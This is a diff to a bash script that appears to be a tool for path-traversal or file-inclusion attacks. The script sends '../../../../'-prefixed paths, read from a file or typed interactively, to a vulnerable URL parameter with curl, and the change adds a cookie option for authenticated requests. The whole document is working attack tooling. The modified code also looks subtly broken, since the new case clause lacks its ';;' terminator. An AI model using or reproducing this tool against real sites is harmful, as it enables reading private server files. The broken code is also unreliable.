@@ -1,7 +1,7 @@
 #!/bin/bash
  
 function usage {
-    echo "usage: $0 [-p prefix] [-s suffix] [-f input.txt] -u URL"
+    echo "usage: $0 [-c cookie] [-p prefix] [-s suffix] [-f input.txt] -u URL"
     echo "eg   : $0 -p \"../../../../\" -s \"\" -u \"http://vulnsite.com/test.php?page=\""
 }
  
@@ -15,9 +15,11 @@ suffix=""
 url=""
 cmdfile=""
 rfifile=""
+cookie=""
  
-while getopts "p:s:u:f:" OPT; do
+while getopts "c:p:s:u:f:" OPT; do
     case $OPT in
+        c) cookie="-b ${OPTARG}"
         p) prefix=$OPTARG;;
         s) suffix=$OPTARG;;
         u) url=$OPTARG;;
@@ -42,7 +44,7 @@ if [[ ! -z $cmdfile ]]; then
     if [[ -f $cmdfile ]]; then
         for i in $(cat $cmdfile); do
             echo "[+] requesting ${url}${prefix}${i}${suffix}"
-            curl "${url}${prefix}${i}${suffix}"
+            curl -s ${cookie} ${url}${prefix}${i}${suffix}
         done
     fi
 else
@@ -51,7 +53,7 @@ else
         printf "[>] "
         read cmd
         echo "[+] requesting ${url}${prefix}${cmd}${suffix}"
-        curl "${url}${prefix}${cmd}${suffix}"
+        curl -s ${cookie} ${url}${prefix}${cmd}${suffix}
         echo ""
     done
 fi
